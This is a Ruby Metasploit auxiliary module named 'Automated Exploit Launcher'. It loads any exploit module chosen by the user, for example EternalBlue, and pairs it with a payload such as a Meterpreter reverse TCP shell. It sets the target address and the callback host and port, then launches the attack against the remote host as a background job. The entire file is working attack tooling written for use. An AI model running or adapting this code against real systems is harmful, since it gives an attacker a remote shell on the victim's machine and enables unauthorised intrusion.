require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Automated Exploit Launcher',
      'Description' => %q{
        This module automatically launches a specified exploit with a chosen payload against a target host.
      },
      'Author'      => ['Diogo'],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('RHOST', [true, 'Target IP address']),
        OptString.new('EXPLOIT', [true, 'Exploit module path (e.g., exploit/windows/smb/ms17_010_eternalblue)']),
        OptString.new('PAYLOAD', [true, 'Payload module path (e.g., windows/meterpreter/reverse_tcp)']),
        OptString.new('LHOST', [true, 'Local IP for reverse connection']),
        OptInt.new('LPORT', [true, 'Local port for reverse connection', 4444])
      ]
    )
  end

  def run
    rhost = datastore['RHOST']
    exploit_name = datastore['EXPLOIT']
    payload_name = datastore['PAYLOAD']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']

    print_status("Launching exploit #{exploit_name} against #{rhost} with payload #{payload_name}")
    
    # Load exploit module
    exploit = framework.exploits.create(exploit_name)
    if exploit.nil?
      print_error("Could not load exploit module: #{exploit_name}")
      return
    end

    # Configure exploit options
    exploit.datastore['RHOST'] = rhost
    exploit.datastore['LHOST'] = lhost
    exploit.datastore['LPORT'] = lport
    exploit.datastore['PAYLOAD'] = payload_name

    # Load and attach payload
    payload = framework.payloads.create(payload_name)
    if payload.nil?
      print_error("Could not load payload module: #{payload_name}")
      return
    end

    payload.datastore['LHOST'] = lhost
    payload.datastore['LPORT'] = lport

    # Exploit target
    begin
      print_status("Running exploit...")
      exploit.exploit_simple(
        'Payload'        => payload,
        'TargetHost'     => rhost,
        'LocalInput'     => self.user_input,
        'LocalOutput'    => self.user_output,
        'RunAsJob'       => true
      )
    rescue ::Exception => e
      print_error("Exploit failed: #{e.message}")
    end
  end
end